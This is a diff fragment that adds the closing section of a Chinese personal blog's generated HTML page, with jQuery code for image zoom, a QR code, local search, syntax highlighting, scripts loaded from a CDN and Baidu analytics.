+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+     // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', '/css/images/error-img.svg')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== '/css/images/error-img.svg') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+        
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+
+    // qrcode
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+
+  })();
+</script>
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    
+<footer class="app-footer">
+  <div id="vcomments" style="max-width:800px"></div>
+  <p class="copyright">
+    <a href="http://tongji.baidu.com/web/welcome/ico?s=371952d9b83cd706a4702ef0c232e3de" target="_blank">...</a>
+    &copy; 2019 |  Powered by 阿金 | 
+    <a href="http://www.miitbeian.gov.cn" rel="nofollow" target="_blank"> 京ICP备18064786号-1 </a>
+  </p>
+</footer>
+<script src="/js/search.js"></script> 
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdn.staticfile.org/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdn.staticfile.org/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+   if (search_path.length == 0) {
+    search_path = "search.xml";
+   }
+   var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    var _baId = '371952d9b83cd706a4702ef0c232e3de';
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </body>
+</html>
